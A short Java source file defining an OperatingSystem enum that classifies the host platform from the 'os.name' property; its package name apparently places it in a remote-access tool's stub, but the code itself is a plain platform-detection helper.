package pro.jrat.api.stub.utils;

public enum OperatingSystem {

	WINDOWS, OSX, LINUX, SOLARIS, FREEBSD, OPENBSD, UNKNOWN;

	public static OperatingSystem getOperatingSystem(String str) {		
		str = str.toLowerCase();
		
		OperatingSystem os;
		
		if (str.contains("win")) {
			os = OperatingSystem.WINDOWS;
		} else if (str.contains("mac")) {
			os = OperatingSystem.OSX;
		} else if (str.contains("linux")) {
			os = OperatingSystem.LINUX;
		} else if (str.contains("solaris") || str.contains("sunos")) {
			os = OperatingSystem.SOLARIS;
		}  else if (str.contains("freebsd")) {
			os = OperatingSystem.FREEBSD;
		} else if (str.contains("openbsd")) {
			os = OperatingSystem.OPENBSD;
		} else {
			os = OperatingSystem.UNKNOWN;
		}
		
		return os;
	}
	
	public static OperatingSystem getOperatingSystem() {
		return OperatingSystem.getOperatingSystem(System.getProperty("os.name"));
	}

}
